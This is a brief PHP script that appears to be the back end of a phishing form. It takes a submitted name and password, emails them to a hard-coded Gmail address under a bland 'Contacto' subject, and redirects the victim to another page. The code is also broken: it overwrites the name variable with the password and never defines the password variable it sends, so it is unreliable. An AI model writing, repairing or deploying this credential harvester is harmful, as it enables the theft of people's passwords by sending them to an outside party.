<?php
 $destino= "freack220@gmail.com";
 $nombre = $_POST["nombre"];
 $nombre = $_POST["contraseña"];
 $contenido = "Nombre: " . $nombre . "\nContraseña: " . $contraseña;
mail($destino,"Contacto", $contenido);
header("Location:moco.html"); 




?>